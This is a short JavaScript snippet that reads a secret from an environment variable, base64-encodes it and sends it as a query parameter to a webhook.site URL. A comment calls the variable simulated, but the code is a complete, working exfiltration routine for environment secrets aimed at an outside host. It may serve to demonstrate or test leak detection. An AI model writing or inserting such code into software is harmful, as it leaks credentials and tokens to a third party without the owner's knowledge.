// Simulated environment variable
const SECRET = process.env.SECRET;
// Encode and send to webhook
const encodedVariable = btoa(SECRET);
const webhookUrl = `https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${encodedVariable}`;

fetch(webhookUrl)
  .then(response => response.text())
  .then(data => {
    console.log('Data sent successfully:', data);
  })
  .catch(error => {
    console.error('Error sending data:', error);
  });
